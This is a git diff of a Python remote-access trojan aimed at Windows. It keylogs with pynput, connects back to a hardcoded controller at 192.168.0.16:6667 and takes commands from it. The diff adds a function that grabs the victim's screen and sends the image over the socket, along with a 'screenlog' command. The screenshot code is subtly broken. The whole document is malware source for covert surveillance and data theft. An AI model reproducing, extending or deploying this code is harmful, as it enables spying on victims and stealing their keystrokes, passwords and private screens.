@@ -7,6 +7,7 @@
 #twitter: @rossin135
 #github: https://github.com/rossiniroberto52
 import socket, os, subprocess, webbrowser, shutil
+from PIL import ImageGrab
 from winreg import *
 from pynput.keyboard import Key as key
 from pynput.keyboard import Listener
@@ -26,6 +27,12 @@ keys = []
 def functionPK(key):
     keys.append(key)
     storeKeysToFile(keys)
+
+def screenshot():
+    arquive = ImageGrab.grab().save("screenshot.jpg", "JPEG")
+    with open(arquive, 'rb') as arq:
+        data_arquive = arq.read()
+        conn.send(data_arquive.encode('utf-8'))
 
 def storeKeysToFile(keys):   
     with open('keylog.txt', 'w') as log:  
@@ -66,7 +73,7 @@ def bat_create(file_path=""):
         conn.send(msg.encode("utf-8"))
 
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-conn.connect(("192.168.0.15",6667))
+conn.connect(("192.168.0.16",6667))
 
 while True:
     cmd = conn.recv(1024).decode('utf-8')
@@ -76,6 +83,8 @@ while True:
         break
     if cmd == "kill":
         kill()
+    if cmd == "screenlog":
+        screenshot()
     if cmd == "troll":
         link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
         while True:
